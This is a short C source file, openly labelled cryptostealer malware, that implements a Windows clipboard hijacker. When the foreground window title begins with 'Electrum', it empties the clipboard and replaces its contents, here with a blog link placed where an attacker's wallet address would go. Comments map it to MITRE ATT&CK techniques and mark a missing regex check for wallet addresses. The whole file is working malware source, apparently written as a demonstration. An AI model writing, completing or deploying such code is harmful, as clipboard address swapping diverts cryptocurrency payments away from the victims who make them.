// Cryptostealer malware that will check the current open windows for a specific cryptocurrency wallet (Electrum), then will change the clipboard data
// assuming that the contents of the clipboard are currently a cryptocurrency wallet
//
// MITRE ATT&CK Techniques Used:
	// T1115 (https://attack.mitre.org/techniques/T1115/)
	// T1010 (https://attack.mitre.org/techniques/T1010/)

#include <stdio.h>
#include <windows.h>

int main() {
    BOOL clipboardResp = OpenClipboard(NULL);
    if (clipboardResp) {
        HANDLE clipboardHandle = GetClipboardData(CF_TEXT);
        if (clipboardHandle == NULL) {
            printf("Could not get clipboard data");
            return 0;
        } else {
            // Grabbing clipboard data & turning it into string that we can read
            char* pszText = (char *)GlobalLock(clipboardHandle);
            printf("%s\n", pszText);
            // Grab window titles
            TCHAR wtitle[MAX_PATH];
            HWND window = GetForegroundWindow();
            GetWindowText(window, wtitle, MAX_PATH);
            // We're looking for a specific window title, one with a crypto wallet, specifically electrum 
            if (strncmp(wtitle, "Electrum", strlen("Electrum")) == 0) { // Change "Electrum" here to be whatever window title you're looking for
                // Todo: Perform regex to ensure clipboard contents have a cryptocurrency wallet address before swapping it
                printf("Emptying clipboard data...\n");
                EmptyClipboard();
          
                printf("Allocating memory...\n");
                HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, 256);
                if (!hMem) {
                    printf("Failed to allocate memory for clipboard data\n");
                    return 0;
                }

                printf("Locking memory...\n");
                char* pData = (char*)GlobalLock(hMem);
                if (!pData) {
                    CloseClipboard();
                    printf("Failed to lock memory!\n");
                    return 0;
                }
                printf("Copying new clipboard data to the allocated memory...\n");
                strcpy(pData, "Visit my blog: https://1d8.github.io/");
                GlobalUnlock(hMem);
                printf("Setting clipboard data...\n");
                SetClipboardData(CF_TEXT, hMem);
                CloseClipboard();
            
            } else {
                printf("Window hasn't been found\n");
            }
        }
    } else {
        printf("Could not open clipboard\n");
        return 0;
    }
}

